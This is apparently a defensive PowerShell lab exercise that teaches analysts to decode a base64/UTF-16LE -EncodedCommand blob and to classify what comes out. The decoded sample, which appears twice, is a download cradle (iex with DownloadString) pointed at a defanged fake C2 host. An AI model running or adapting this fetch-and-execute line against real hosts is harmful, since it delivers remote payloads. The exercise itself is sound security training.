## BRIEF
Base64/UTF-16LE is the foundational deobfuscation primitive — the same encoding `-EncodedCommand` always uses (L4.2), and the same shape a 4104 ScriptBlock event's raw source can arrive in. Two .NET calls peel it: `[System.Convert]::FromBase64String()` decodes the base64 to raw bytes, `[System.Text.Encoding]::Unicode.GetString()` reads those bytes as UTF-16LE text.
Run the decode for real. Reconstruct to a **string** and **read** it — the reflex for this entire phase is decode to read, never to run.

## GUIDED STEPS

1. **Run the decode for real**:
   ```bash
   pwsh -NoProfile -NonInteractive -File decode.ps1
   ```
   Real output:
   ```
   iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p1')
   ```
   That's the whole pipeline: `[Convert]::FromBase64String` turns the base64 text into raw bytes, `[Text.Encoding]::Unicode.GetString` reads those bytes as UTF-16LE — the same two calls decode any `-EncodedCommand` blob or 4104 raw-source field.

2. **Record the reconstruction**:
   Create `plaintext.txt` with the decoded text you just saw:
   ```text
   iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p1')
   ```

3. **Name the technique**:
   Create `technique.txt`:
   ```text
   The decoded payload is a download cradle (iex + DownloadString), the same pattern from L4.1.
   Encoding: base64 of UTF-16LE, decoded with [System.Convert]::FromBase64String + [System.Text.Encoding]::Unicode.GetString.
   ATT&CK: T1140 (Deobfuscate/Decode Files or Information), T1027 (Obfuscated Files or Information).
   ```

4. **Check your work**:
   ```bash
   lab check ps L5.1
   ```
